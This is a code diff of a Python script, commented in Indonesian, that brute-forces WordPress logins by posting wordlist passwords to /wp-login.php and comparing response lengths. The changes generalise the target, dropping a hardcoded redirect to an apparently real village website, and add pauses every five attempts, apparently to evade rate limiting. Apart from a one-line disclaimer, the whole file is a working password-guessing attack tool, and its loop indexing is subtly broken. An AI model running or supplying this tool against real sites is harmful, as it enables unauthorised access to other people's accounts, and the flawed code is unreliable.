@@ -1,3 +1,12 @@
+#   Deskripsi
+#  Simple program untuk membrute force wordpress login page
+#  Info lanjutan tentang brutefroce -> https://en.wikipedia.org/wiki/Brute-force_attack
+#   Disclaimer
+#  Jangan digunakan untuk tindakan yang tidak dapat dipertanggung jawabkan!
+#   Penggunaan
+#  'python wpbrute.py -t <base_url> -u <username(single)> -p <file_where_you_store_password_wordlist>'
+
+from time import sleep
 from requests import *
 from argparse import *
 
@@ -13,15 +22,18 @@ def error(message):
 
 def send_req(url,username,passwd):
 
+
+    the_url=url+'/wp-login.php'
     headers={'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
-    body="log="+username+"&pwd="+passwd+"&wp-submit=Log+Masuk&redirect_to=http%3A%2F%2Fbango.desa.id%2Fwp-admin%2F&testcookie=1"
-    p=post(url,data=body,headers=headers)
-    print('username : %s\t| password: %s'%(username,passwd))
+    body="log="+username+"&pwd="+passwd+"&wp-submit=Log+Masuk&redirect_to="+url+"%2Fwp-admin%2F&testcookie=1"
+    p=post(the_url,data=body,headers=headers)
+    print('\rusername : %s\t| password: %s'%(username,passwd),end='')
     return len(p.text)
     
 
 def sure_wrong(url,username):
-    return send_req(url,username,'passwdIniPastiSalah')
+    the_url=url+'/wp-login.php'
+    return send_req(url,username,'lLlIlLl')
 
 def file_handle(filename):
     
@@ -45,15 +57,18 @@ def args_parser():
     args=parser.parse_args()
     return args
 
-def main(base_url,username,pass_file):
-
+def main(url,username,pass_file):
+    
+    i=0
     file_handle(pass_file)
-    url=base_url+'/wp-login.php'
     the_wrong=sure_wrong(url,username)
 
     for i in range(len(file_text)):
-        if(send_req(url,username,file_text[i])!=the_wrong):
-            break
+        i+=1
+        if(i%5==0):
+            sleep(6)
+        if(send_req(url,username,file_text[i])!=the_wrong): 
+           break
 
 
 if __name__=='__main__':
